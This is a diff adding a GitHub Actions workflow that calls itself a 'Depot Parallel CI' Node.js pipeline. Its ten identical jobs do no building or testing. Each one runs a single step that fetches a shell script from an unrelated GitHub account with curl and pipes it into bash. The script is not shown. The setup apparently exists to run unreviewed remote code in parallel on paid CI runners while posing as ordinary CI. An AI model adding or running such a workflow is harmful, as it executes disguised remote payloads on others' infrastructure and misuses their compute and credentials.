@@ -1,0 +1,121 @@
+
+name: Depot Parallel CI - Ubuntu Node.js
+
+on:
+  push:
+    branches: ["main"]
+  pull_request:
+    branches: ["main"]
+  workflow_dispatch:
+
+jobs:
+
+  job-1:
+    name: Node.js Job 1
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-2:
+    name: Node.js Job 2
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-3:
+    name: Node.js Job 3
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-4:
+    name: Node.js Job 4
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-5:
+    name: Node.js Job 5
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-6:
+    name: Node.js Job 6
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-7:
+    name: Node.js Job 7
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-8:
+    name: Node.js Job 8
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-9:
+    name: Node.js Job 9
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+
+  job-10:
+    name: Node.js Job 10
+    runs-on: depot-ubuntu-24.04-4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: |
+          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
